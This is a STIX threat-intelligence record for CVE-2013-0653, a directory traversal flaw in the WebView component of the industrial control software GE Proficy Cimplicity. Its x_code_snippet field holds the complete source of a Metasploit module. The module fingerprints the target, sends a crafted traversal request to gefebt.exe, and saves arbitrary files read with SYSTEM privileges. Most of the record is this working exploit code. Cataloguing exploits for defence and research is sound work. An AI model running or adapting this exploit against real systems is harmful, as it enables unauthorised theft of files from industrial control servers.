{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d8b0922-7a5e-41cc-930b-9d68dc54ae3a",
    "created": "2024-08-14T16:22:25.945653Z",
    "modified": "2024-08-14T16:22:25.945657Z",
    "name": "GE Proficy Cimplicity WebView substitute.bcl Directory Traversal",
    "description": " This module abuses a directory traversal in GE Proficy Cimplicity, specifically on the gefebt.exe component used by the WebView, in order to retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully on GE Proficy Cimplicity 7.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/ge_proficy_substitute_traversal.rb",
            "external_id": "ge_proficy_substitute_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0653"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'uri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'GE Proficy Cimplicity WebView substitute.bcl Directory Traversal',\n      'Description' => %q{\n        This module abuses a directory traversal in GE Proficy Cimplicity, specifically on the\n        gefebt.exe component used by the WebView, in order to retrieve arbitrary files with SYSTEM\n        privileges. This module has been tested successfully on GE Proficy Cimplicity 7.5.\n      },\n      'Author'       =>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-0653' ],\n          [ 'OSVDB', '89490' ],\n          [ 'BID', '57505' ],\n          [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-13-022-02' ]\n        ],\n      'DisclosureDate' => '2013-01-22'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI',[true, 'Path to CimWeb', '/CimWeb']),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\\\win.ini']),\n        # By default gefebt.exe installed on C:\\Program Files\\GE Fanuc\\Proficy CIMPLICITY\\WebPages\\CimWeb\n        OptInt.new('DEPTH', [true, 'Traversal depth', 5])\n      ])\n  end\n\n  def normalize_uri(*strs)\n    new_str = strs * \"/\"\n\n    new_str = new_str.gsub!(\"//\", \"/\") while new_str.index(\"//\")\n\n    # Makes sure there's a starting slash\n    unless new_str[0,1] == '/'\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def target_uri\n    begin\n      # In case TARGETURI is empty, at least we default to '/'\n      u = datastore['TARGETURI']\n      u = \"/\" if u.nil? or u.empty?\n      URI(u)\n    rescue ::URI::InvalidURIError\n      print_error \"Invalid URI: #{datastore['TARGETURI'].inspect}\"\n      raise Msf::OptionValidateError.new(['TARGETURI'])\n    end\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, \"/\"))\n  end\n\n  def is_proficy?\n    connect\n    req =  \"GET #{normalize_uri(target_uri.path, \"index.html\")} HTTP/1.0\\r\\n\\r\\n\"\n    sock.put(req)\n    res = sock.get_once\n    disconnect\n\n    if res and res =~ /gefebt\\.exe/\n      return true\n    else\n      return false\n    end\n  end\n\n  # We can't use the http client msf mixin because the Proficy Web server\n  # return a malformed HTTP response with the file contents, there aren't\n  # two new lines (but one) between the HTTP headers and the body content.\n  def read_file(file)\n    travs = \"\"\n    travs << \"../\" * datastore['DEPTH']\n    travs << file\n\n    print_status(\"#{@peer} - Retrieving file contents...\")\n\n    connect\n    req =  \"GET #{normalize_uri(target_uri.path, \"gefebt.exe\")}?substitute.bcl+FILE=#{travs} HTTP/1.0\\r\\n\\r\\n\"\n    sock.put(req)\n    res = sock.get_once\n    disconnect\n\n    if res and res =~ /HTTP\\/1\\.0 200 OK/\n      return res\n    else\n      return nil\n    end\n\n  end\n\n  def run\n    @peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"#{@peer} - Checking if it's a GE Proficy Application...\")\n    if is_proficy?\n      print_good(\"#{@peer} - Check successful\")\n    else\n      print_error(\"#{@peer} - GE proficy not found\")\n      return\n    end\n\n    contents = read_file(datastore['FILEPATH'])\n    if contents.nil?\n      print_error(\"#{@peer} - File not downloaded\")\n      return\n    end\n\n    file_name = my_basename(datastore['FILEPATH'])\n    path = store_loot(\n        'ge.proficy.traversal',\n        'application/octet-stream',\n        rhost,\n        contents,\n        file_name\n    )\n    print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-22"
}